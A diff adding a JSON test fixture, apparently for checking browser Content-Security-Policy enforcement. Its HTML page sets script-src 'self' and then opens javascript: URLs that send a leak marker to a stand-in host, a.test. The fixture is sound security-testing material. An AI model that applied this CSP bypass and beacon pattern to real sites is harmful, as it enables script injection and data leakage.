@@ -1,0 +1,12 @@
+```json
+{
+  "c582387": {
+    "url_queue.txt": "https://leak.test/CSP/c582387/main\nhttps://a.test/report/?leak=baseline\n",
+    "leak.test": {
+      "main": {
+        "index.html": "<!DOCTYPE html>\n<html>\n<head>\n<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'self'\">\n<script>\n  par = 'val';\n  url1 = \"javascript:'<scr\" + \"ipt>document.location=\\\"https://a.test/report/?leak=c582387\\\";</scr\" + \"ipt>'\";\n  open(url1);\n  url2 = \"javascript:document.location=\\\"https://a.test/report/?leak=c582387\\\";\";\n  open(url2);\n</script>\n</head>\n</html>\n"
+      }
+    }
+  }
+}
+```
